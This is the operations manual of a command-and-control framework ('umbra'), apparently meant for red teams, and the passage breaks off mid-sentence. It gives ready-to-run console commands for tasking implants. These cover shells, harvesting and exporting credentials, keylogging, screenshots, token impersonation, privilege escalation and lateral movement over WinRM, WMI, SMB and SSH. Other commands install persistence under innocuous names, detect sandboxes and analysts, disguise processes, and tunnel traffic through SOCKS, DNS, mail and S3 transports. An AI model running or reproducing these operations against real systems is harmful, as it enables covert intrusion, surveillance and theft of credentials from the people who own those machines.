# Operations

## 1. First deployment

```bash
# 1. secrets (agent PSK and per-operator tokens are independent)
./scripts/gen-secrets.sh alice bob
#  -> export UMBRA_AGENT_PSK=...
#  -> export UMBRA_OPERATOR_TOKENS=alice:...,bob:...

# 2. configuration
install -d -m 700 /etc/umbra /var/lib/umbra
install -m 600 deploy/server.prod.json   /etc/umbra/server.json
install -m 600 /dev/stdin /etc/umbra/agent.psk <<< "$UMBRA_AGENT_PSK"
printf 'UMBRA_OPERATOR_TOKENS=%s\n' "$UMBRA_OPERATOR_TOKENS" > /etc/umbra/server.env

chmod 600 /etc/umbra/server.env

# 3. service
install -m 644 deploy/umbra-server.service /etc/systemd/system/
systemctl daemon-reload && systemctl enable --now umbra-server
journalctl -u umbra-server -f
```

The key is hex: the server decodes it and the beacons read it as hex, so
the bytes behind the text are the key on both sides.  A value that is not
hex is taken as it is by the server, which is what a lab with raw bytes in
the environment needs.

The server prints a fingerprint (first 16 hex chars of SHA-256) for every
operator token it loads — never the token itself. If a fingerprint is missing,
the token env var is not visible to the unit.

## 2. Listener layout

| Listener | Default | Exposure |
|---|---|---|
| `agent_listen` | `0.0.0.0:4001` | reachable by implants (TCP beacon, pivot callbacks) |
| `operator_listen` | `127.0.0.1:4002` | **never** public; reach it through SSH or WireGuard |
| `http_listen` | `127.0.0.1:4003` | behind the tunnel-facing proxy (`deploy/nginx-http-transport.conf`); also serves the WebSocket upgrade |
| `tls_listen` | *(empty)* | mutual TLS: agents and operators that present a client certificate |
| `dns_listen` | *(empty)* | the DNS tunnel (UDP); only answers for `dns_domain` |
| `vpn_listen` | *(empty)* | the layer-3 tunnel (UDP) |
| `socks_listen` | *(empty)* | the persistent SOCKS5 proxy through `socks_agent` |

`server.http_tls_cert` / `http_tls_key` make the Go listener itself serve TLS.
Leave them empty for beacons: an implant has no TLS stack, so only a TLS-speaking
relay could use that listener. The supported shape is tunnel → plain listener.

The beacons speak plain TCP and plain HTTP/1.1, so **TLS termination in front
of them does not work** — a plaintext client cannot complete a TLS handshake.
When implants must cross an untrusted network, put the transport inside an
encrypted tunnel (WireGuard, IPsec, an mTLS mesh) and keep the listener bound
to the tunnel interface. The frames are individually AEAD-sealed, so a tunnel
is about hiding *traffic shape* (ports, cadence, sizes), not about protecting
payload contents.

The operator console is the exception: it has a TLS stack, so a remote console
can use the mutual TLS listener:

```bash
umbra --server c2.example.com:4002 --operator alice --tls \
      --tls-ca /etc/umbra/ca.pem --tls-server-name c2.example.com \
      --tls-cert /etc/umbra/console.pem --tls-key /etc/umbra/console.key \
      --watch
```

`tls_listen` refuses to start without `tls_cert`, `tls_key` and
`tls_client_ca`: the listener is mutual TLS, so a client certificate is
mandatory and a stolen token alone is not enough to take over an operation.

### Pinning the console

A certificate authority proves that the certificate was written by somebody
the operator trusts; a pin proves that it is *this* key.  Both sides may
pin, and the pin is the fingerprint of the public key: the hex SHA-256 of
the `SubjectPublicKeyInfo`.

```bash
# 1. the pin of the certificate of the console
umbra pin /etc/umbra/console.pem
# -> 36a3e56f74fac2fdefc67e8eab8225eb6f1966e10d977b617331231a859ba50a

# 2. the server pins that key (in /etc/umbra/server.json)
#    "tls_client_spki": "36a3e56f74fac2fdefc67e8eab8225eb6f1966e10d977b617331231a859ba50a"

# 3. the console pins the server
umbra --server c2.example.com:4002 --operator alice --tls \
      --tls-ca /etc/umbra/ca.pem --tls-server-name c2.example.com \
      --tls-cert /etc/umbra/console.pem --tls-key /etc/umbra/console.key \
      --tls-pin 9f2c...  --watch
```

`--tls-pin` may also come from the environment (`UMBRA_TLS_PIN`), so the pin
of the console does not have to sit in the history of a shell.

**The pin of the server is printed the same way**, with the server binary
when the certificate of the server is at hand:

```bash
umbra-server -gen-spki /etc/umbra/server.pem
```

**A handover of a renewed key.**  Both sides take a list of pins, separated
by commas, so the old key and the new one are both welcome while the
handover lasts:

```json
"tls_client_spki": "36a3e5...ba50a,91bc7...4d2f"
```

Taking the old pin away is a matter of writing the list again and
restarting the process that holds it.  The server refuses a configuration
whose pin is not the hex of a SHA-256 fingerprint, so a typo is reported
at the start and not at the first connection.

**What a pin does not do.**  It does not replace the umbra handshake: the
TLS layer still proves *who* the peer is, and the handshake still decides
*what* the peer may do.  It also does not widen the trust: when a
certificate authority is configured as well, the chain is verified on top
of the pin.  And the console checks the pin *before* the umbra handshake,
so a console that refuses a server never sends its token to it.

## 3. Operator workflow

```bash
export UMBRA_OPERATOR_TOKEN='<your token>'      # or --token-file
umbra --server 127.0.0.1:4002 --operator alice --watch

umbra[-]> agents
umbra[-]> use web-01
umbra[web-01]> run whoami
umbra[web-01]> exec sysinfo
umbra[web-01]> sleep 120 40        # slow the beacon down
umbra[web-01]> tasks 10
umbra[web-01]> kill                # ask the beacon to exit
```

Scripted use (CI, reports):

```bash
umbra --server 127.0.0.1:4002 --operator alice agents
umbra --server 127.0.0.1:4002 --operator alice task web-01 shell \
      --args '{"cmd":"uname -a"}' --wait
umbra --server 127.0.0.1:4002 --operator alice result t-1a2b3c4d
```

`--token` shows up in the process list; prefer `--token-file` or the environment.

### Work that has a time

A task may carry a deadline and a timeout, and the server keeps both
promises instead of leaving them to the good manners of the beacon:

```bash
umbra task web-01 shell --args '{"cmd":"collect the logs"}' \
      --deadline 2026-01-01T18:30:00Z --task-timeout 120 --wait
```

* the **deadline** is the moment after which the work is not worth running.
  A task that passes it is *cancelled* with the reason "the deadline passed",
  and the `task.expired` event says so.
* the **timeout** is how long the task may run.  It travels to the beacon
  inside the arguments of the task, so the implant stops the command itself,
  and the server fails the task when the beacon does not answer in time
  (the `task.timeout` event).

Neither is required: a task without them behaves exactly as it always did.

## 3a. Working on groups of agents

An engagement is rarely about a single machine.  The console therefore speaks
one filter language everywhere, and every command that acts on more than one
agent takes the same selection.

```bash
# what is out there?
umbra agents
umbra agents --state online --os windows
umbra agents --tag finance --transport http

# label the hosts, so the next command can find them
umbra tag web-01 finance dc-01
umbra tag web-01 legacy --remove
umbra tag web-01 prod staging --set

# act on the group
umbra task --agents web-01,web-02 --kind shell --args '{"cmd":"whoami"}'
umbra task --filter state=online,tag=finance --kind sysinfo
```

The filter keys are `state`, `transport`, `os`, `arch`, `tag` and `user`; the
same keys work in the RPC (`agents.list`) and in the interactive console
(`agents state=online tag=finance`).

**A selection is always explicit.**  `task.bulk`, `agents.tag` and
`agents.policy` refuse to run without either a list of agent ids or a filter:
a command that quietly applies to every agent in the inventory is not
recoverable once it is sent, so the server asks for a target instead of
guessing one.

The interactive console understands the same verbs:

```
umbra[-]> agents state=online
umbra[-]> tag web-01 finance
umbra[-]> policy web-01 sleep=120 jitter=45
```

## 3b. Interactive sessions, chains and alerts

### An interactive session

A session is a process on the target that the operator types into.  The
beacon keeps it open, streams what the process prints and takes what the
operator writes:

```bash
umbra session web-01                     # the platform's own shell
umbra session web-01 --cmd "python3"    # a specific program
umbra session web-01 --input "id"       # write one line and wait
```

Inside the console the same thing is one command: `session [cmd]`.  The
session survives a re-connect, so it keeps working when the check-in
interval is a minute; the beacon holds the connection open while a session is
live, so the output arrives as it happens instead of at the next check-in.

The sessions that are open are listed on their own, so an operator who
lost one can see that it is still there and when it last said something:

```bash
umbra sessions
```

### A multi-stage task

A chain runs several tasks one after the other, and the output of a stage
becomes the input of the next one.  `{{output}}` is the placeholder:

```bash
umbra chain web-01 --stages '[
  {"kind":"shell","args":{"cmd":"ls /etc/umbra"}},
  {"kind":"shell","args":{"cmd":"cat {{output}}"}}
]'
```

A chain is the shape of most real work: look, read, send.  The stages are
ordinary tasks in the history, so the console can still show what each stage
did.

### Alerts

The server can watch its own event stream, so a console does not have to:

```json
"alerts": [
  {"name": "dc-offline", "event": "agent.offline", "tag": "dc", "cooldown_s": 300},
  {"name": "failed-task", "event": "task.result", "task_kind": "bof", "cooldown_s": 60}
]
```

A rule matches on the event kind, on a tag of the agent, on the beginning of
the agent id and on the kind of the task.  When it matches, the server logs
the event loudly and pushes an `alert` event, which the console shows like
any other event.  The cooldown keeps a noisy agent from alerting on every
check-in.  `umbra alerts` lists the rules the server is using.

### Keeping the implant alive

```bash
umbra persist web-01                     # install it so it survives a reboot
umbra persist web-01 --method registry.run   # a specific technique
umbra persist web-01 --name "Update Service" # a label that says nothing
umbra unpersist web-01                   # take every start-up entry away again
umbra update web-01 /tmp/umbra-beacon --sha256 <digest>
```

The persistence is a manager around a catalogue of techniques, not one
scheduled task.  `--method auto` lets the manager pick the quietest one the
host can carry without administrator rights; naming a technique asks for
that one:

| Platform | Techniques |
|---|---|
| Windows | `registry.run`, `registry.runonce`, `registry.explorer_run`, `registry.winlogon`, `registry.ifeo`, `registry.appinit`, `registry.com`, `registry.printmonitor`, `registry.shell_ext`, `schtasks`, `taskxml`, `service`, `service.dll`, `startup`, `bcdedit`, `wmi.event`, `dll.searchorder` |
| Linux | `systemd.user`, `systemd.system`, `systemd.timer`, `systemd.execstartpre`, `cron.user`, `cron.d`, `rc.local`, `init.d`, `profile`, `profile.alias`, `profile.env`, `ld_preload`, `xdg_autostart`, `at`, `kernel.module` |
| macOS | `launchd.agent`, `launchd.daemon`, `loginitem`, `shell_rc`, `cron.user`, `xdg_autostart` |
| Android | `boot_receiver`, `foreground_service`, `alarm`, `jobscheduler`, `app_update`, `accessibility`, `device_owner` |

A few of them need something from the operator, and the report says so
instead of pretending:

* `dll.searchorder` needs the module to plant (`--args '{"dll":"...",
  "dir":"C:\\Program Files\\Some App"}'`) and the directory of the
  program that loads it.
* `service.dll` needs the shim (`--args '{"dll":"..."}'`) and the name of
  the service that loads it.
* `wmi.event` writes three objects in the subscription namespace: a filter,
  a consumer and the binding between them.  Nothing of the implant is
  written to the disk of the host.
* `systemd.execstartpre` needs the unit it hooks into
  (`--args '{"unit":"sshd.service"}'`): the implant runs as a step before
  the real work of a unit that already exists.
* `kernel.module` needs the module (`--args '{"module":"..."}'`) and
  administrator rights.  It is the loudest technique in the catalogue.
* `profile` hooks the shell; the file it hooks is chosen with
  `--args '{"file":"profile"}'` (`~/.profile`) or
  `--args '{"file":"profile.d"}'` (`/etc/profile.d/umbra.sh`), and the
  default is `~/.bashrc`.  `profile.env` is the environment source of the
  machine: it puts the directory of the implant in the `PATH` of every
  session and needs administrator rights.
* The accessibility service of a phone can only be enabled by the user of
  the phone, in the settings of Android.  The implant records the entry
  and says that the operator has to do it; the verification reads the
  answer of the system.
* The device owner of a phone is the most extreme technique there is: the
  phone is no longer a personal device.  It only works when the
  application was pushed to the phone as the device owner candidate, and
  the implant reports what the system answered.

Three things make the difference between a start-up entry and a persistence
engine:

* **It is verified.**  The manager reads the entry back after installing it
  (the registry value, the unit file, the crontab line, the scheduled task)
  and reports the truth.  An entry that cannot be read is a failure, not a
  success.
* **It is idempotent.**  Installing twice leaves exactly one entry, and the
  manager keeps its own record of what it installed, so it knows what to
  check and what to remove weeks later.
* **It is quiet.**  The implant copies itself into a plausible location and
  the entry points at that copy; the label becomes the value name, the
  service display name and the task name.  The install prints nothing on the
  target unless `--verbose` is asked for.

The lifecycle is visible to the operator:

```bash
umbra persist-list web-01                # what is installed on the host
umbra persist-verify web-01              # read every entry back
umbra persist-health web-01              # covered, degraded or broken
umbra persist-migrate web-01 --from registry.run --to schtasks
umbra persist-report                     # the whole fleet
```

`persist-migrate` installs the new technique and verifies it *before* the
old one is removed, so the coverage never has a gap.  `persist-report` is
the handover artefact: it lists the hosts that carry an entry, the entries
that are broken and the techniques that have to be removed when the
engagement ends.  `engagement.wipe` clears the record of the engagement on
the server; it deliberately does not touch the hosts, because somebody has
to remove what was installed there.

The update replaces the running binary: the new one is pushed to the host
first (the `upload` task), the digest is checked, and only then is the old
binary swapped out.  An implant that installs a file nobody verified is an
implant that installs whatever the network sent it.

### Knowing the host

The implant knows what the host looks like, and the operator should know it
too.  The posture engine answers four questions — virtual or real, a
workstation or a server, a developer's box or a plain machine, a lab
machine or a production one — and says how sure it is:

```bash
umbra evade-report                      # the posture of the whole fleet
umbra evade-report web-01              # the posture of one host, from the host
umbra evade-posture web-01 --no-silence --sandbox-factor 300
umbra evade-profile web-01 --base 90 --busy-start 8 --busy-end 18
umbra evade-shape web-01 --mode fixed --size 2048 --reorder
umbra evade-killswitch web-01 --file /tmp/stop-the-implant
umbra evade-killswitch web-01 --uptime 72
umbra evade-killswitch web-01 --clear
```

`evade-report` without an agent reads the record the server keeps, so the
whole fleet is one command and no host is touched.

**The artefacts are not a blacklist.**  Every artefact the engine finds
carries a class, a severity and a confidence: a virtual machine is a hint
(most companies run them), a sandbox that injects itself into every process
is nearly a proof, and an analyst's debugger is a proof.  The engine
reports; the operator decides.

**What the posture changes.**  The sleep interval is multiplied with the
factor of the posture, the jitter is raised, and — only when the operator
armed it — the implant stops answering on a host that looks like an
analyst's sandbox.  The defaults are conservative: the implant adapts to
its environment, but it never falls silent on its own.

**The day.**  `evade-profile` replaces the flat interval with a schedule:
busy while the office is open, quiet at night, lazier at the weekend.  The
factors are percentages of the base interval.

**The shape of the traffic.**  `evade-shape` chooses the size bucket of
the frames (`off`, `random`, `fixed`) and may shuffle the order of the
operations inside a cycle.

**The kill switch.**  The blast radius is the operator's decision:
`--file`, `--registry`, `--at`, `--uptime` and `--marker` are the
triggers.  When the trigger fires, the implant removes its own persistence
entries, wipes its state and stops — the machine is left the way it was
found.  The panic task of the server is the sixth trigger, and it needs no
arming: `agents.panic` and the ordinary `exit` task take the persistence
entries with them, so the last word of the operator always leaves the
target clean.

**The hygiene.**

```bash
umbra hygiene web-01 --memory            # what holds a secret, and what was wiped
umbra hygiene web-01 --copy /opt/app/update-agent --cwd /opt/app
umbra hygiene web-01 --name updater --clean-env
```

The memory of the implant is cleaned on the way out: the key material, the
keystrokes, the credentials and the module images live in guards that wipe
themselves, including on the path where the work failed.  The process is
cleaned as well: the implant can run under a copied name, in a plausible
directory, with an environment that says nothing about the tool, and — on
Windows — with the parent it claims to have.

### The material and the vault

Everything the implant finds about an identity is a record: a kind, a
source, an account, a target and a confidence.  The value of the material
only leaves the host when the operator asks for it, and it only leaves the
server when the operator asks for that.

```bash
umbra task web-01 --kind creds --args '{"mode":"all"}'     # the shape of the material
umbra task web-01 --kind creds --args '{"mode":"all","raw":true}'
umbra creds-list                                        # the vault of the engagement
umbra creds-list --kind hash --agent web-01
umbra creds-search svc-sql01                           # search the account, the target and the note
umbra creds-export --kind password                     # the value (operator role)
```

The rules are short:

* The **event stream never carries a secret**.  The task record and the
  `creds.collected` event keep the shape of the material; the value goes to
  the vault.
* The vault is **encrypted at rest** when the server has a key.  Set
  `vault_key` in the configuration, or `UMBRA_VAULT_KEY` in the
  environment.  Without a key the server keeps the digest and drops the
  value: an operator still sees what was found and where, but the value is
  not kept anywhere.
* The **digest is always kept**, so two hosts that share a credential can
  be seen to share it without the key.
* `creds-export` is an **operator** action, and the console asks for the
  value only when the operator asked for it.

**The token work.**

```bash
umbra task web-01 --kind token --args '{"mode":"list"}'
umbra task web-01 --kind token --args '{"mode":"list","session":1}'
umbra task web-01 --kind token --args '{"mode":"impersonate","pid":1180}'
umbra task web-01 --kind token --args '{"mode":"become","pid":1180}'
umbra task web-01 --kind token --args '{"mode":"restore"}'
```

`impersonate` borrows the account of a process for the next task and gives
it back when the task is done; `become` keeps it until the operator sends
`restore`.  The identity travels with the check-in, so the inventory shows
the truth, and the server drops it when the session of the agent ends.

**The privilege escalation.**  Every attempt is reported on its own — the
technique, the outcome and what it changed on the host:

```bash
umbra task web-01 --kind privesc --args '{"mode":"privileges"}'
umbra task web-01 --kind privesc --args '{"mode":"token"}'
```

**The domain.**  The reconnaissance now carries the edges that matter for
movement: the trusts of the domain, the accounts that may delegate, the
groups and their members, the machine accounts, and the permissions that
give a principal the full control, the right to write the permissions or
the right to replicate the directory.

### Running a command on a far host

The implant does not need a new tunnel to reach a far host: the agent that
holds the network path runs the command there, with its own credentials and
its own reach.  The output comes back through that same agent.

```bash
umbra task pivot-01 --kind winrm.exec --args '{"target":"dc01","command":"whoami"}'
umbra task pivot-01 --kind wmi.exec   --args '{"target":"dc01","command":"net user"}'
umbra task pivot-01 --kind dcom.exec  --args '{"target":"web01","command":"ipconfig"}'
umbra task pivot-01 --kind smb.exec   --args '{"target":"web01","command":"hostname"}'
umbra task pivot-01 --kind ldap.query --args '{"target":"dc01","command":"user"}'
umbra task pivot-01 --kind ssh.exec   --args '{"target":"10.0.0.9","command":"id","user":"root"}'
```

Every one of them cleans up after itself: the remote file, the remote task
and the remote service are removed as soon as the output has been read.  The
protocol that does not return the output itself (`wmi`, `dcom`, `smb`) reads
it back over the administrative share of the target.

### Keeping the implant reachable

The beacon can know more than one address of the team server:

```bash
UMBRA_SERVERS=10.0.0.5:4001,10.0.0.9:4001 UMBRA_PROXY=127.0.0.1:1080 ...
```

When the first address is down, the beacon tries the next one, so a server
that moves does not take the implant with it.  `UMBRA_PROXY` routes the
connection through a SOCKS5 proxy, for a network that only lets a proxy out.

### The processes

```bash
umbra proc web-01
umbra proc-kill web-01 4321
umbra proc-kill web-01 whoami
```

The table is the operating system's own: the pid, the parent, the user, the
moment the process started and the exact command line.  A shell tool hides
most of that, and it is exactly what an operator asks about when a host
behaves strangely.

### The command namespace

The server ships with a small namespace of saved commands, so a team says
`whoami` instead of remembering the exact task arguments:

| alias | what it does |
| --- | --- |
| `whoami`, `hostname` | the identity of the implant and the name of the host |
| `system`, `processes`, `network` | the system information, the processes, the network |
| `listening`, `routes`, `services` | the sockets, the routing table, the services |
| `screenshot` | a picture of the desktop |
| `triage`, `find` | the file triage and the file search |

```bash
umbra alias list
umbra alias run web-01 whoami
umbra alias run web-01 triage --args '{"path":"/etc/passwd"}'
umbra alias run web-01 find --arg name="*.kdbx" --arg path=/home
```

An alias may also point at an armory extension instead of a task kind, which
is what makes the namespace extensible at runtime.  The team can add its own
(`umbra alias add ...`) and replace the built-in ones.

### Doing it again

A task that failed for a reason that is gone now can be run again:

```bash
umbra tasks --state failed
umbra retry t-1a2b3c4d
```

The old record stays as the history of what went wrong, and the new task is
what the agent runs.  A task that is still queued or delivered cannot be
retried: a delivered task may still be running, and running it twice is worse
than not running it.

### The handover

At the end of an engagement somebody has to write down what was done and
what was found.  The console writes it:

```bash
umbra report web-01 --out web-01.md     # one host
umbra report --all --out engagement.md   # the whole engagement
```

The report holds the host's record, the tasks that were run on it and the
notes of the local notebook, as one Markdown document.  The engagement
report holds every host and every task, which is the document that goes
with the handover.

The output of a task is often a file — a digest list, a dump, a log — so
`umbra result <task-id> --out out.bin` writes it whole instead of printing
it.

### Finding things on the target

```bash
umbra triage web-01 /usr/bin/suspicious     # size, digest, format, entropy
umbra find web-01 "*.kdbx" --path /home     # by name (a glob or a substring)
umbra find web-01 --content "BEGIN PRIVATE KEY" --path /etc
umbra netinfo web-01                        # interfaces, routes, neighbours
umbra tail web-01 /var/log/auth.log --lines 50   # what a log says right now
umbra hash web-01 /usr/bin/suspicious       # the SHA-256 of a file
umbra proc web-01                           # the process table
umbra proc-kill web-01 4321                 # a process, by pid or by name
umbra keylog-file web-01 /tmp/keys.log --seconds 300   # the keys, to be fetched later
umbra registry win-01 "SOFTWARE\Microsoft" --hive HKLM  # the Windows registry
umbra screenshot web-01 screen.png          # the screen of the target
umbra clipboard web-01                      # the clipboard of the target
umbra env web-01 --filter TOKEN            # the environment of the target
umbra resolve web-01 db.internal           # where a name points at
umbra scan web-01 10.0.0.0/29 --ports 22,80,443   # who answers
umbra touch web-01 /tmp/marker             # create a file and stamp it
```

The scan is a plain TCP connect: it says which hosts answered, it does not
read a banner and it does not touch the service it finds.  The range is
expanded by the beacon itself, and the number of addresses is capped, so a
`/8` cannot turn into sixteen million connect attempts.

`umbra env` is worth a look early on every host: the environment of a
service account holds the paths, the endpoints and the tokens that the
process itself uses.

## 3c. The dashboard

The console is the tool of the day.  The dashboard is what a team leaves open
on a second screen: the inventory, the running tasks and the event stream,
without a terminal in the way.

```json
{ "dashboard_listen": "127.0.0.1:8080", "dashboard_read_only": false }
```

Open `http://127.0.0.1:8080/` and paste an operator token.  The dashboard
accepts the same tokens as the console, so it is exactly as protected: the
token is compared in constant time and is never written to a log.

It is deliberately small.  It shows what is there and it queues a task;
everything else (the pivots, the team chat, the extension store) stays in
the console, where the answers are reviewed before they are given.  With
`dashboard_read_only` the task button is refused, which is what a dashboard
on a screen somebody walks past should be.

The endpoints it serves:

| endpoint | what it answers |
| --- | --- |
| `GET /api/agents` | the inventory |
| `GET /api/tasks?agent=&kind=&state=&limit=` | the task history |
| `GET /api/events?after=&limit=` | the journal of the events |
| `GET /api/stats` | the counters of the server |
| `POST /api/task` | `{"id": ..., "kind": ..., "args": {...}}` queues a task |

The dashboard is a **local** listener by default.  Putting it on a public
address means putting the operator token on a public address as well, and
that is a decision an operator makes on purpose, not one a default makes
for them.

## 3d. The artifact store

The team server keeps files: a payload, a configuration, a tool.  The
operator puts a file into the store once and pushes it to every host that
needs it, instead of uploading the same bytes again for every machine.

```bash
umbra artifact list                                    # what the server holds
umbra artifact put payload.bin --file ./payload.bin    # once
umbra artifact push payload.bin web-01 --path /tmp/payload.bin
umbra artifact get payload.bin --file ./payload.bin    # back again
umbra artifact remove payload.bin
```

The store is content addressed: the blob is written under the SHA-256 of its
contents, so two uploads of the same file share one copy on disk, and the
digest is shown with the entry.  `umbra artifact list` prints it.

A push is not a new beacon command.  The server builds a chain of ordinary
`upload` tasks, one per chunk, and the beacon writes them one after the
other; the last chunk closes the file and answers with the SHA-256 of the
whole file, so the operator can check the copy on the target against the
copy in the store.  A chunk that fails stops the chain instead of leaving a
hole in the file.

The uploads are chunked because the frames are bounded: 256 KiB per request,
which always fits in one frame with room to spare.  The store lives next to
the state file (`<data dir>/artifacts`), so a deployment that already gives
the server a writable data directory needs no extra setup.

## 3e. The reach

A pivot is a door into a network.  The server does not hold the door: the
agent does, the server only drives it, and the picture of every door is
written down so the team can see what is open before it is used.

### The picture

```bash
umbra pivot list                 # every tunnel: agent, mode, listener, target
umbra pivot list --json          # the same, for a script
```

The list is a graph, not a table of ports:

| Field | What it says |
|---|---|
| `agent_id` | the agent that holds the tunnel |
| `through` | the agent the tunnel runs through, when it is a chained pivot |
| `mode` | `socks` (a proxy) or `forward` (a fixed target) |
| `listen` | the address and port the team connects to |
| `host` / `port` | the target of a forward |
| `streams` | how many connections are open through it right now |
| `bytes_up` / `bytes_down` | what has moved through it |
| `last_active` | when something last moved (a unix stamp) |
| `state` | `open`, `closed` or `waiting` |
| `claim` | the name of the claim the tunnel belongs to |
| `dns` | `remote` (the agent resolves the name) or `local` (the server does) |
| `path` | the chain of hops the server walked to reach the target |

The dashboard draws the same thing: the "reach" panel shows the agents as
nodes and the pivots as edges, so a chained pivot is visible as a line that
starts at one agent and ends at another.

### The route of an agent

The operator knows the network of the target; the beacon does not.  "This
agent only speaks DNS", "that one goes through a front domain", "the third
one sits behind a proxy that reads the traffic" is written down as the
*route* of the agent, and the server pushes it with the task batch.

```bash
# this agent speaks DNS first and falls back to TCP
umbra transport set agent-01 --primary dns --fallback tcp

# this one speaks WebSocket through a front domain
umbra transport set agent-02 --primary ws --fallback http,tcp --front cdn.example.com

# the proxy in front of it reads the traffic
umbra transport set agent-03 --primary tcp --inspect

umbra transport get agent-02      # the route of one agent
umbra transport list              # the routes of every agent that has one
```

The beacon follows the route from the next cycle on: the transport it
speaks is the one the operator named, and the fallback order is the one the
operator wrote.  A transport the framework does not know is refused at the
console, not pushed to the beacon.

### The chain

A pivot can run through other pivots.  The operator names the far end; the
server resolves the road from the addresses the beacons reported:

```bash
# server -> agent-01 -> agent-02 -> target
umbra pivot open agent-01 --mode socks --through agent-02

# a longer chain: every --through adds one hop
umbra pivot open agent-01 --mode socks --through agent-02 --through agent-03
```

The server asks the first agent for a stream to the next one, speaks the
peer handshake on it (PROTOCOL.md §7.3a) and continues over the peer link.
When the peer link of a hop cannot be established, the server takes that
hop over itself: the pivot keeps working and the traffic takes another
road.  The "reach" table shows the chain in the `path` column.

The beacons that wait for peers must serve their peer listener; the address
they wait on is reported to the server in the handshake, so nothing has to
be configured by hand:

```bash
umbra-beacon --server 10.0.0.5:4001 --peer-listen 0.0.0.0:9001
```

### The proxy

```bash
# a SOCKS5 proxy through one agent, with a name and a password
umbra pivot open agent-01 --mode socks --claim corp --user alice --password secret

# the proxy answers for the team, the name is resolved by the agent
curl --socks5-hostname alice:secret@127.0.0.1:1080 http://10.10.0.5/
```

The proxy speaks SOCKS5 with the username/password method (RFC 1929).  The
credentials belong to the tunnel, so two proxies can have two different
pairs and a listener can be closed without touching the others.  The server
compares them in constant time, so a wrong password does not leak its
length.

**Where the name is resolved.**  By default the name is handed to the agent
and resolved there (`--dns remote`): the agent is the one that can see the
internal resolver, and the server never learns the address.  With `--dns
local` the server resolves the name first and the agent gets an address.

**What the proxy refuses.**  The list of refused targets is a policy of the
deployment, not a runtime accident:

```json
{
  "pivot_deny": ["10.0.0.5", "10.0.0.0/24:445", "metadata.google.internal:80"]
}
```

A rule is `host` or `host:port`; without a port it refuses every port of
that host.  The host is compared against the name that was asked for, the
address the name resolves to, and — when the rule is a network — every
address inside it.  A rule for `10.0.0.5` therefore also covers the name
that points at it, and `169.254.0.0/16` refuses the whole link-local range
including the cloud metadata address.  A refused target is answered with
`0x02` (not allowed by ruleset) and it is written in the connection log, so
a refusal is visible in the audit trail.

**Who used it.**  Every connection is booked: the client address, the target,
the bytes in both directions, the time and the outcome.  The accounting is
per client, the log keeps the last 256 connections, and both are part of
`pivot.list`.  A proxy nobody used is different from a proxy that is in use,
and the difference should be visible without reading the packets.

### The forwards

```bash
# a fixed target
umbra pivot open agent-01 --mode forward --host 10.10.0.5 --port 445 --claim corp

# a listener that only the console may use
umbra pivot open agent-01 --mode forward --host 10.10.0.5 --port 445 --loopback
```

A forward is a listener on the server and a stream through the agent to one
target.  Several forwards can be open at the same time, each with its own
listener.  With `--loopback` the listener is bound to `127.0.0.1`: only the
machine the server runs on may use it, which is the safe default for a
forward that has no authentication of its own.

A forward survives the agent going away.  The listener stays bound, the
server waits for the agent to come back, and the next connection that
arrives is served by the new session.  The team does not have to rebuild the
forward after a sleep cycle or a network change.

### The claims

A claim is a name for a group of tunnels.  It is the unit of "this belongs
to the operation on the corporate network" and the unit of "tear it all
down":

```bash
umbra pivot open agent-01 --mode socks --claim corp
umbra pivot open agent-02 --mode forward --host 10.10.0.5 --port 445 --claim corp
umbra pivot claims                   # what the claims hold
umbra pivot release corp             # every tunnel of the claim is closed
```

`pivot.release` closes the listeners, closes the streams and forgets the
claim; the accounting of what went through stays in the log.  Releasing a
claim needs the operator role; opening one needs the operator role as well,
and listing the reach needs only a viewer.

### The server configuration

| Key | What it does |
|---|---|
| `socks_listen` | a permanent SOCKS5 proxy through `socks_agent` |
| `socks_agent` | the agent that proxy runs through |
| `socks_user` / `socks_password` | the credentials of that proxy (RFC 1929) |
| `pivot_deny` | the targets the proxies refuse |

The permanent proxy and the pivots opened from the console share the same
deny list and the same accounting.

### The transports that keep no connection

Two transports do not keep a connection at all, and they are the answer to
a network where nothing else gets through:

| transport | the server needs | the beacon needs |
|---|---|---|
| `smtp` | `smtp_listen` and `pop3_listen` | the address of both |
| `s3` | `s3_listen` | the address of the endpoint |

```
{
  "smtp_listen": "0.0.0.0:25",
  "pop3_listen": "0.0.0.0:110",
  "s3_listen": "0.0.0.0:9000"
}
```

The operator then tells the agent which one it speaks:

```
umbra transport set <agent> --primary smtp
umbra transport set <agent> --primary s3
```

The mail transport uses the team key: the id of the agent is the user name
and the password is derived from the key, so nothing has to be configured
per agent.  The object transport uses the same password as the secret key
of the request and signs every request with AWS Signature Version 4, so the
same beacon can talk to a real bucket.

### The layer-3 tunnel

The tunnel is a transport of its own: a UDP socket, its own keys and its
own replay protection.  It keeps working when the beaconing channel does
not, so a host that can only send UDP out is still reachable.

The beacon joins the tunnel with the key it already has, so there is
nothing to distribute:

```
umbra vpn status
umbra vpn peers
```

The server hands out the addresses of the tunnel, and the operator may
send a whole network to one peer — the peer is then the gateway of it:

```
umbra vpn route laptop-1 192.168.5.0/24
umbra vpn routes
```

The counters of every route and every peer are in the same tables.

A peer that can only be reached through another agent joins the relay of
that agent instead of the server.  The relay carries the datagrams, and
the keys of the session stay between the peer and the server:

```
# on the agent that is in the middle
umbra vpn relay <agent> --

# on the peer that is behind it
umbra vpn start --addr <the relay of the agent in the middle>
```

The question of the operator travels through the tunnel and comes back
through it, so the answer says more than the bookkeeping of the server:

```
umbra vpn ping laptop-1
```

### A pivot on a named pipe

On a Windows server the pivot may listen on a named pipe instead of a TCP
socket.  Only a process of the host can open it, so nothing outside the
host reaches it.

```
umbra pivot open laptop-1 --mode socks --pipe
```

The reply carries the name of the pipe (`\\.\pipe\umbra-<tunnel>`), and
the operator opens it with the tools of the host:

```powershell
# the proxy of the pivot, read with the SOCKS5 client of the host
curl --socks5-hostname "\\.\pipe\umbra-tun-8f2a1c" http://10.0.0.5:8080/
```

### IPv6

A pivot may be opened on an IPv6 address, and a proxy may run on one:

```
umbra pivot open <agent> --mode socks --listen "[::1]:1080"
```

| What | IPv4 | IPv6 |
|---|---|---|
| a listener | `127.0.0.1:1080` | `[::1]:1080` |
| a target | `10.0.0.5:443` | `[2001:db8::5]:443` |
| a scan | `10.0.0.0/24` | `2001:db8::/120` |
| the SOCKS5 answer | `ATYP 0x01`, 4 bytes | `ATYP 0x04`, 16 bytes |

Three rules keep it working:

* an IPv6 literal is written in brackets, so `host:port` is never ambiguous;
* a listener that is forced onto the loopback keeps its family: an IPv6
  listener moves to `::1`, not to `127.0.0.1`;
* the answer of the SOCKS5 proxy carries the address of the listener, in the
  family of the listener.

The same rules hold in the implant: the transports dial an IPv6 literal
